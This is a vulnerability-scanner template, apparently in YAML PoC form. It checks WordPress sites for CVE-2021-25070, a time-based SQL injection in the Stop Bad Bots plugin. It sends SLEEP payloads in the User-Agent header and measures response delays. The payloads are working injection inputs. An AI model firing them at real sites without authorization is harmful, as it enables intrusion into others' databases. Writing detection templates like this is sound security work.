name: poc-yaml-wordpress-stopbadbots-cve-2021-25070-sqli
manual: true
transport: http
set:
    rInt0: randomInt(5, 7)
    rInt1: randomInt(2, 4)
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /
            headers:
                User-Agent: \'+SLEEP(0))--+g
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("wp-content/plugins")
        output:
            CheckTimeOut: response.latency
    r1:
        request:
            cache: false
            method: GET
            path: /
            read_timeout: "10"
            headers:
                User-Agent: \'+SLEEP({{rInt0}}))--+g
            follow_redirects: false
        expression: response.status == 200 && response.latency - CheckTimeOut >= rInt0 * 1000 - 500
    r2:
        request:
            cache: false
            method: GET
            path: /
            read_timeout: "10"
            headers:
                User-Agent: \'+SLEEP({{rInt1}}))--+g
            follow_redirects: false
        expression: response.status == 200 && response.latency - CheckTimeOut >= rInt1 * 1000 - 500
expression: r0() && r1() && r2()
detail:
    author: Â∞èz
    links:
        - https://wpscan.com/vulnerability/e00b2946-15e5-4458-9b13-2e272630a36f
    vulnerability:
        level: critical